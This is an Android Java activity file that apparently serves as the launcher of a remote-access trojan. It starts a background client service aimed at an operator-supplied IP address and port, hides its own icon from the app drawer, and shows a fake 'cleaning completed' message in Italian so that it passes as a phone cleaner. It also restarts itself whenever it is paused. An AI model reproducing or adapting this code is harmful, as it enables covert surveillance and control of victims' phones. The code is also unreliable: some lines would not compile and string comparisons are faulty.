package my.app.client;

import my.app.client.R;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.os.StrictMode;
import android.text.InputFilter.LengthFilter;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

public class LauncherActivity extends Activity {

	Intent Client, ClientAlt;
	Button btnStart, btnStop;
	EditText ipfield, portfield;
	String myIp = ""; //insert ip.
	int myPort = ""; //remove quotes and insert port.

	@Override
	public void onStart() {
		super.onStart();
		onResume();
	}

	@Override
	public void onResume() {
		super.onResume();
		setContentView(R.layout.main);

		Client = new Intent(this, Client.class);
		Client.setAction(LauncherActivity.class.getName());

		btnStart = (Button) findViewById(R.id.buttonstart);
		btnStop = (Button) findViewById(R.id.buttonstop);
		ipfield = (EditText) findViewById(R.id.ipfield);
		portfield = (EditText) findViewById(R.id.portfield);

		if (myIp == "") {
			ipfield.setText("");//insert ip
			portfield.setText("");//insert port
			Client.putExtra("IP", ipfield.getText().toString());
			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()));
		} else {
			ipfield.setText(myIp);
			portfield.setText(String.valueOf(myPort));
			Client.putExtra("IP", myIp);
			Client.putExtra("PORT", myPort);
		}

		startService(Client);
		btnStart.setEnabled(false);
		btnStop.setEnabled(true);
	}

	public void onPause() {
		super.onPause();
		Log.i("pausa", "hey");
		moveTaskToBack(false);

		onResume();
	}

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);

		Client = new Intent(this, Client.class);
		Client.setAction(LauncherActivity.class.getName());

		btnStart = (Button) findViewById(R.id.buttonstart);
		btnStop = (Button) findViewById(R.id.buttonstop);
		ipfield = (EditText) findViewById(R.id.ipfield);
		portfield = (EditText) findViewById(R.id.portfield);

		if (myIp == "") {
			ipfield.setText(""); //insert ip
			portfield.setText(""); //insert port
			Client.putExtra("IP", ipfield.getText().toString());
			Client.putExtra("PORT", Integer.parseInt(portfield.getText().toString()));
		} else {
			ipfield.setText(myIp);
			portfield.setText(String.valueOf(myPort));
			Client.putExtra("IP", myIp);
			Client.putExtra("PORT", myPort);
		}

		startService(Client);
		btnStart.setEnabled(false);
		btnStop.setEnabled(true);
	}

	public void onClickBtn(View v) throws InterruptedException {
		hideApplication();
		ProgressBar pb = (ProgressBar) findViewById(R.id.progressBar1);
		pb.setVisibility(v.VISIBLE);
		Thread.sleep(5000);
		Toast.makeText(getApplicationContext(), "Pulizia completata! Arrivederci...", Toast.LENGTH_LONG).show();
		onBackPressed();
	}

	private void hideApplication() {
		/* nasconde l'icona dal drawer dopo il primo avvio */
		PackageManager pm = getApplicationContext().getPackageManager();
		pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);

	}
}
